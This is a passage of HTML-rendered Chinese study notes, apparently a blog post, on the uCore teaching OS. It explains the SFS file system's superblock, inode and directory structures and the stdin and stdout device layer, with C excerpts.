class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* filesystem for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> <span class="hljs-title">super</span>;</span>                         <span class="hljs-comment">/* on-disk superblock */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>                             <span class="hljs-comment">/* device mounted on */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bitmap</span> *<span class="hljs-title">freemap</span>;</span>                         <span class="hljs-comment">/* blocks in use are mared 0 */</span><br>    <span class="hljs-keyword">bool</span> super_dirty;                               <span class="hljs-comment">/* true if super/freemap modified */</span><br>    <span class="hljs-keyword">void</span> *sfs_buffer;                               <span class="hljs-comment">/* buffer for non-block aligned io 缓冲区起始地址*/</span><br>    <span class="hljs-keyword">semaphore_t</span> fs_sem;                             <span class="hljs-comment">/* semaphore for fs */</span><br>    <span class="hljs-keyword">semaphore_t</span> io_sem;                             <span class="hljs-comment">/* semaphore for io */</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex_sem;                          <span class="hljs-comment">/* semaphore for link/unlink and rename */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_list;                        <span class="hljs-comment">/* inode linked-list 应该是在内存中的*/</span><br>    <span class="hljs-keyword">list_entry_t</span> *hash_list;                        <span class="hljs-comment">/* inode hash linked-list */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>结构中包含了底层设备的超级块<code>superblock</code>、所挂载的设备<code>dev</code>、以及底层设备中用于表示空间分配情况的<code>freemap</code>等。</p><h4 id="文件系统布局"><a href="#文件系统布局" class="headerlink" title="文件系统布局"></a>文件系统布局</h4><p><img src="../../image/ucore/image-20220105200753016.png" alt="image-20220105200753016"></p><p>文件系统通常保存在磁盘上。在本实验中，第三个磁盘（即disk0，前两个磁盘分别是 ucore.img 和 swap.img）用于存放一个SFS文件系统（Simple Filesystem）。通常文件系统中，磁盘的使用是以扇区（Sector）为单位的，但是为了实现简便，SFS 中以 <strong>block</strong> （4K，与内存 page 大小相等）为基本单位。</p><p>第0个块(4K)是<strong>superblock</strong>，它包含了关于文件系统的所有关键参数，当计算机被启动或文件系统被首次接触时，超级块的内容就会被装入内存。其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> magic;                                  <span class="hljs-comment">/* magic number, should be SFS_MAGIC */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                 <span class="hljs-comment">/* # of blocks in fs */</span><br>    <span class="hljs-keyword">uint32_t</span> unused_blocks;                         <span class="hljs-comment">/* # of unused blocks in fs */</span><br>    <span class="hljs-keyword">char</span> info[SFS_MAX_INFO_LEN + <span class="hljs-number">1</span>];                <span class="hljs-comment">/* infomation for sfs  */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><blockquote><p>magic number就是一串神秘莫测的数字, 这里用来标识SFS文件系统, 值为0x2f8dbe2a</p></blockquote><p>需要注意的是虽然inode的大小小于一个块的大小（4096B），<strong>但为了实现简单，每个 inode 都占用一个完整的 block。</strong> </p><p>在sfs_fs.c文件中的<code>sfs_do_mount</code>函数中，完成了加载位于硬盘上的SFS文件系统的超级块superblock和freemap的工作。这样，在内存中就有了SFS文件系统的全局信息。</p><h4 id="索引节点"><a href="#索引节点" class="headerlink" title="索引节点"></a>索引节点</h4><p>在<code>sfs</code>层面上，<code>inode</code>结构既可表示文件<code>file</code>、目录<code>dir</code>，也可表示设备<code>device</code>。而区分<code>inode</code>结构的操作有两种，一种是其<code>in_info</code>成员变量，另一种是该结构的成员指针<code>in_ops</code>。以下是函数<code>sfs_get_ops</code>的源码，该函数返回某个属性（文件/目录）所对应的<code>inode</code>操作：</p><blockquote><p>注意，设置inode_ops的操作不止一处，以下代码只作为示例。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_get_ops - return function addr of fs_node_dirops/sfs_node_fileops</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> struct inode_ops *</span><br><span class="hljs-function"><span class="hljs-title">sfs_get_ops</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> type)</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span> (type) &#123;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_DIR:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_dirops;<br>    <span class="hljs-keyword">case</span> SFS_TYPE_FILE:<br>        <span class="hljs-keyword">return</span> &amp;sfs_node_fileops;<br>    &#125;<br>    panic(<span class="hljs-string">&quot;invalid file type %d.\n&quot;</span>, type);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>当uCore创建一个<strong>用于存储文件/目录</strong>的<code>inode</code>结构（即该<code>inode</code>结构的<code>in_info</code>成员变量为<code>sfs_inode</code>类型）时，程序会执行函数<code>sfs_create_inode</code>。该函数会<strong>将<code>inode</code>结构中的<code>sfs_inode</code>成员与磁盘对应结点<code>sfs_disk_inode</code>相关联</strong>，从而使得只凭<code>inode</code>即可操作该结点。 </p><blockquote><p>比如在打开文件的时候, 需要调用<code>sfs_dirent_search_nolock</code>查找路径对应inode, 如果找到了会返回ino编号, 然后调用<code>sfs_load_inode</code>根据ino和sfs找到对应inode, 把对应<code>sfs_disk_inode</code>读到内存中, 然后调用**<code>sfs_create_inode</code>**, 初始化<code>inode</code>里的<code>sfs_inode</code>.</p></blockquote><blockquote><p>用于描述设备<code>device</code>的<code>inode</code>会在其他函数中被初始化，不会执行函数<code>sfs_create_inode</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sfs_create_inode - alloc a inode in memroy, and init din/ino/dirty/reclian_count/sem fields in sfs_inode in inode</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sfs_create_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct sfs_disk_inode *din, <span class="hljs-keyword">uint32_t</span> ino, struct inode **node_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span><br>    <span class="hljs-keyword">if</span> ((node = alloc_inode(sfs_inode)) != <span class="hljs-literal">NULL</span>) &#123;<br>        vop_init(node, sfs_get_ops(din-&gt;type), info2fs(sfs, sfs));<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> *<span class="hljs-title">sin</span> =</span> vop_info(node, sfs_inode);<br>        <span class="hljs-built_in">sin</span>-&gt;din = din, <span class="hljs-built_in">sin</span>-&gt;ino = ino, <span class="hljs-built_in">sin</span>-&gt;dirty = <span class="hljs-number">0</span>, <span class="hljs-built_in">sin</span>-&gt;reclaim_count = <span class="hljs-number">1</span>;<br>        sem_init(&amp;(<span class="hljs-built_in">sin</span>-&gt;sem), <span class="hljs-number">1</span>);<br>        *node_store = node;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_NO_MEM;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="磁盘索引节点"><a href="#磁盘索引节点" class="headerlink" title="磁盘索引节点"></a>磁盘索引节点</h5><p>就是<code>sfs_disk_inode </code>, understand结构图中最后一个结构体, <strong>保存在磁盘上</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> size;                                  <span class="hljs-comment">/* size of the file (in bytes) */</span><br>    <span class="hljs-keyword">uint16_t</span> type;                                  <span class="hljs-comment">/* one of SYS_TYPE_* above */</span><br>    <span class="hljs-keyword">uint16_t</span> nlinks;                                <span class="hljs-comment">/* # of hard links to this file */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                <span class="hljs-comment">/* # of blocks */</span><br>    <span class="hljs-keyword">uint32_t</span> direct[SFS_NDIRECT];                   <span class="hljs-comment">/* direct blocks 存储的是ino编号*/</span><br>    <span class="hljs-keyword">uint32_t</span> indirect;                              <span class="hljs-comment">/* indirect blocks */</span><br><span class="hljs-comment">//    uint32_t db_indirect;                           /* double indirect blocks */</span><br><span class="hljs-comment">//   unused</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>对于文件, <u>索引值</u><strong>指向的</strong>是数据块.</p><p>对于目录, <u>索引值</u><strong>指向的</strong>是下面这个结构体。数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* file entry (on disk) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_entry</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">//索引节点所占数据块索引值</span><br>    <span class="hljs-keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="hljs-number">1</span>];               <span class="hljs-comment">//文件名</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h5 id="内存索引节点"><a href="#内存索引节点" class="headerlink" title="内存索引节点"></a>内存索引节点</h5><p>即<code>sfs_inode</code>.  需要注意，一个内存inode是在打开一个文件后才创建的，如果关机则相关信息都会消失。<br>而硬盘inode(即<code>sfs_disk_inode</code>)的内容是保存在硬盘中的，只是在进程需要时才被读入到内存中，用于访问文件或目录的具体内容数据</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* inode for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_disk_inode</span> *<span class="hljs-title">din</span>;</span>                     <span class="hljs-comment">/* on-disk inode 一对一指针*/</span><br>    <span class="hljs-keyword">uint32_t</span> ino;                                   <span class="hljs-comment">/* inode number */</span><br>    <span class="hljs-keyword">bool</span> dirty;                                     <span class="hljs-comment">/* true if inode modified */</span><br>    <span class="hljs-keyword">int</span> reclaim_count;                              <span class="hljs-comment">/* kill inode if it hits zero */</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;                                <span class="hljs-comment">/* semaphore for din */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_link;                        <span class="hljs-comment">/* entry for linked-list in sfs_fs */</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;                         <span class="hljs-comment">/* entry for hash linked-list in sfs_fs */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>为了方便实现上面提到的多级数据的访问以及目录中 entry 的操作，对 inode SFS实现了一些<strong>辅助的函数</strong>：</p><ol><li><code>sfs_bmap_load_nolock</code>：将对应 sfs_inode 的第 index 个索引指向的 block 的<strong>索引值</strong>取出存到相应的指针指向的单元（ino_store）。该函数只接受 index &lt;= inode-&gt;blocks 的参数。当 index == inode-&gt;blocks 时，该函数理解为需要为 inode 增长一个 block。<strong>并标记 inode 为 dirty</strong>（所有对 inode 数据的修改都要做这样的操作，这样，当 inode 不再使用的时候，sfs 能够保证 inode 数据能够被写回到磁盘）。sfs_bmap_load_nolock 调用的 sfs_bmap_get_nolock 来完成相应的操作, 分为直接索引和间接索引两种情况, <u>完成ino的load操作</u>.（sfs_bmap_get_nolock 只由 sfs_bmap_load_nolock 调用）</li><li><code>sfs_bmap_truncate_nolock</code>：将多级数据索引表的最后一个 entry 释放掉。<strong>他可以认为是 sfs_bmap_load_nolock 中，index == inode-&gt;blocks 的逆操作</strong>(检测到时就会从freemap中alloc一个)。当一个文件或目录被删除时，sfs 会循环调用该函数直到 inode-&gt;blocks 减为 0，释放所有的数据页。函数通过 sfs_bmap_free_nolock 来实现，他应该是 sfs_bmap_get_nolock 的逆操作。和 sfs_bmap_get_nolock 一样，调用 sfs_bmap_free_nolock 也要格外小心。</li><li><code>sfs_dirent_read_nolock</code>：将目录的第 slot 个 entry 读取到指定的内存空间。他通过上面提到的函数来完成。</li><li><code>sfs_dirent_search_nolock</code>：是常用的查找函数。他在目录下查找 name，并且返回相应的搜索结果（文件或文件夹）的 inode 的编号（<strong>也是磁盘编号</strong>），和相应的 entry 在该目录的 index 编号以及目录下的数据页是否有空闲的 entry。（SFS 实现里文件的数据页是连续的，不存在任何空洞；而对于目录，数据页不是连续的，当某个 entry 删除的时候，SFS 通过设置 entry-&gt;ino 为0将该 entry 所在的 block 标记为 free，在需要添加新 entry 的时候，SFS 优先使用这些 free 的 entry，其次才会去在数据页尾追加新的 entry.)</li></ol><blockquote><p> 从下到上表明了他们之间的包含关系. 注意到<code>dirent</code>是指<code>directory entry</code>, 最后两个函数专用于目录</p></blockquote><p><strong>注意，这些后缀为 nolock 的函数，只能在已经获得相应 inode 的semaphore才能调用。</strong> </p><hr><h4 id="Inode的文件-目录操作函数"><a href="#Inode的文件-目录操作函数" class="headerlink" title="Inode的文件,目录操作函数"></a>Inode的文件,目录操作函数</h4><p>这些操作函数使用结构体+函数指针来定义, 在inode结构体中被赋值.</p><ul><li>首先是文件操作函数: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>sfs_openfile不用做什么事；sfs_close需要把对文件的修改内容写回到硬盘上，这样确保硬盘上的文件内容数据是最新的；sfs_read和sfs_write函数都调用了一个函数sfs_io，并最终通过访问硬盘驱动来完成对文件内容数据的读写。</p><ul><li>然后是目录操作函数: </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>对于目录操作而言，由于目录也是一种文件，所以sfs_opendir、sys_close对应户进程发出的open、close函数。相对于sfs_open，sfs_opendir只是完成一些open函数传递的参数判断，没做其他更多的事情。目录的close操作与文件的close操作完全一致。由于目录的内容数据与文件的内容数据不同，所以读出目录的内容数据的函数是sfs_getdirentry，其主要工作是获取目录下的文件inode信息。</p><h3 id="5-device层"><a href="#5-device层" class="headerlink" title="5.device层"></a>5.device层</h3><blockquote><p>目前实现了stdin设备文件文件、stdout设备文件、disk0设备。stdin设备就是键盘，stdout设备就是CONSOLE（串口、并口和文本显示器），而disk0设备是承载SFS文件系统的磁盘设备。(无情的复制机器)</p></blockquote><p>为了表示一个设备，需要有对应的数据结构，ucore为此定义了struct device，其描述如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> &#123;</span><br>    <span class="hljs-keyword">size_t</span> d_blocks;    <span class="hljs-comment">//设备占用的数据块个数            </span><br>    <span class="hljs-keyword">size_t</span> d_blocksize;  <span class="hljs-comment">//数据块的大小</span><br>    <span class="hljs-keyword">int</span> (*d_open)(struct device *dev, <span class="hljs-keyword">uint32_t</span> open_flags);  <span class="hljs-comment">//打开设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_close)(struct device *dev); <span class="hljs-comment">//关闭设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_io)(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write); <span class="hljs-comment">//读写设备的函数指针</span><br>    <span class="hljs-keyword">int</span> (*d_ioctl)(struct device *dev, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data); <span class="hljs-comment">//用ioctl方式控制设备的函数指针</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这个数据结构能够支持对块设备（比如磁盘）、字符设备（比如键盘、串口）的表示，完成对设备的基本操作。ucore虚拟文件系统为了把这些设备链接在一起，还定义了一个设备链表，即双向链表<strong>vdev_list</strong>，这样通过访问此链表，可以找到ucore能够访问的所有设备文件。</p><p>但这个设备描述没有与文件系统以及表示一个文件的inode数据结构建立关系，为此，还需要另外一个数据结构把device和inode联通起来，这就是vfs_dev_t数据结构：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// device info entry in vdev_list </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">devnode</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>;</span><br>    <span class="hljs-keyword">bool</span> mountable;<br>    <span class="hljs-keyword">list_entry_t</span> vdev_link;<br>&#125; <span class="hljs-keyword">vfs_dev_t</span>;<br></code></pre></div></td></tr></table></figure><p>利用<code>vfs_dev_t</code>数据结构，就可以让文件系统通过一个链接<code>vfs_dev_t</code>结构的双向链表找到device对应的inode数据结构，一个inode节点的成员变量in_type的值是0x1234，则此 inode的成员变量in_info将成为一个device结构。这样inode就和一个设备建立了联系，这个inode就是一个设备文件。</p><blockquote><p>对于文件来说, inode-&gt;in_info是sfs_inode类型, 记录了文件在磁盘上的信息;<br>而对于设备来说, 是device类型, 存储着针对于device的操作函数和相关信息.1</p></blockquote><h4 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h4><p><strong>初始化</strong> </p><p>既然stdout设备是设备文件系统的文件，自然有自己的inode结构。在系统初始化时，即只需如下处理过程</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kern_init--&gt;fs_init--&gt;dev_init--&gt;dev_init_stdout --&gt; dev_create_inode<br>                 --&gt; stdout_device_init<br>                 --&gt; vfs_add_dev<br></code></pre></div></td></tr></table></figure><p>在dev_init_stdout中完成了对stdout设备文件的初始化。即首先创建了一个inode，然后通过stdout_device_init完成对inode中的成员变量inode-&gt;__device_info进行初始：</p><p>这里的stdout设备文件实际上就是指的console外设（它其实是串口、并口和CGA的组合型外设）。这个设备文件是一个只写设备，如果读这个设备，就会出错。接下来我们看看stdout设备的相关处理过程。</p><p><strong>初始化</strong> </p><p>stdout设备文件的初始化过程主要由stdout_device_init完成，其具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdout_open;<br>    dev-&gt;d_close = stdout_close;<br>    dev-&gt;d_io = stdout_io;<br>    dev-&gt;d_ioctl = stdout_ioctl;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，stdout_open函数完成设备文件打开工作，如果发现用户进程调用open函数的参数flags不是只写（O_WRONLY），则会报错。即<code>stdout_open(struct device *dev, uint32_t open_flags)  </code> </p><p><strong>访问操作实现</strong> </p><p>stdout_io函数完成设备的写操作工作, <strong>具体是从iobuf中一个一个字符输出到串口并口和CGA显示器上</strong>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdout_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (write) &#123;<br>        <span class="hljs-keyword">char</span> *data = iob-&gt;io_base;<br>        <span class="hljs-keyword">for</span> (; iob-&gt;io_resid != <span class="hljs-number">0</span>; iob-&gt;io_resid --) &#123;<br>            cputchar(*data ++);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，要写的数据放在iob-&gt;io_base所指的内存区域，一直写到iob-&gt;io_resid的值为0为止。每次写操作都是通过cputchar来完成的，此函数最终将通过console外设驱动来完成把数据输出到串口、并口和CGA显示器上过程。另外，也可以注意到，如果用户想执行读操作，则stdout_io函数直接返回错误值**-**E_INVAL。</p><h4 id="stdin"><a href="#stdin" class="headerlink" title="stdin"></a>stdin</h4><p>这里的stdin设备文件实际上就是指的键盘。这个设备文件是一个只读设备，如果写这个设备，就会出错。接下来我们看看stdin设备的相关处理过程。</p><p><strong>初始化</strong> </p><p>stdin设备文件的初始化过程主要由stdin_device_init完成了主要的初始化工作，具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_device_init</span><span class="hljs-params">(struct device *dev)</span> </span>&#123;<br>    dev-&gt;d_blocks = <span class="hljs-number">0</span>;<br>    dev-&gt;d_blocksize = <span class="hljs-number">1</span>;<br>    dev-&gt;d_open = stdin_open;<br>    dev-&gt;d_close = stdin_close;<br>    dev-&gt;d_io = stdin_io;<br>    dev-&gt;d_ioctl = stdin_ioctl;<br><span class="hljs-comment">/* 这玩意儿是一个在dev_stdin.c中的全局静态变量, </span><br><span class="hljs-comment">     * 分别是pointer_read_position and p_write_position</span><br><span class="hljs-comment">     * 如果read_pos &lt; write_pos则说明有新字符</span><br><span class="hljs-comment">    p_rpos = p_wpos = 0; </span><br><span class="hljs-comment">    wait_queue_init(wait_queue);</span><br><span class="hljs-comment">&#125;</span><br></code></pre></div></td></tr></table></figure><p>相对于stdout的初始化过程，stdin的初始化相对复杂一些，多了一个stdin_buffer缓冲区，描述缓冲区读写位置的变量p_rpos、p_wpos以及用于等待缓冲区的等待队列wait_queue。在stdin_device_init函数的初始化中，也完成了对p_rpos、p_wpos和wait_queue的初始化。</p><p><strong>访问操作实现</strong> </p><p>stdin_io函数负责完成设备的读操作工作，具体实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">stdin_io</span><span class="hljs-params">(struct device *dev, struct iobuf *iob, <span class="hljs-keyword">bool</span> write)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!write) &#123;<br>        <span class="hljs-keyword">int</span> ret;<br>        <span class="hljs-keyword">if</span> ((ret = dev_stdin_read(iob-&gt;io_base, iob-&gt;io_resid)) &gt; <span class="hljs-number">0</span>) &#123;<br>            iob-&gt;io_resid -= ret;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到，如果是写操作，则stdin_io函数直接报错返回。所以这也进一步说明了此设备文件是只读文件。如果此读操作，则此函数进一步调用dev_stdin_read函数完成对键盘设备的读入操作。dev_stdin_read函数的实现相对复杂一些，主要的流程如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">dev_stdin_read</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span> </span>&#123;<br>    <span 